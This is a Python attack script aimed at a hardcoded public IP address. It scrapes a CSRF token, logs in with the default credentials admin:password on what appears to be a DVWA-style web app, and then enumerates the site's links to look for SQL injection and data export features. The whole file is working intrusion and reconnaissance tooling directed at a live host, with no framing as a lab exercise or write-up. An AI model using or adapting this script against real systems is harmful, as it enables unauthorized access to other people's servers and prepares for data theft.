
import requests
import re

target_url = "http://31.97.117.123"
session = requests.Session()

# Login
print("[*] Logging in with admin:password...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=True)
print(f"[*] Login status: {response.status_code}")

# Check if logged in
if "admin" in response.text or "logout" in response.text.lower():
    print("[+] Successfully authenticated!")
    
    # Now look for SQL injection vulnerabilities or data export features
    print("\n[*] Fetching index page...")
    index = session.get(f"{target_url}/index.php")
    
    # Look for available modules/pages
    links = re.findall(r'href=["\']([^"\']+)["\']', index.text)
    print("[*] Available links:")
    for link in links[:20]:
        if link.startswith('http'):
            continue
        print(f"  - {link}")


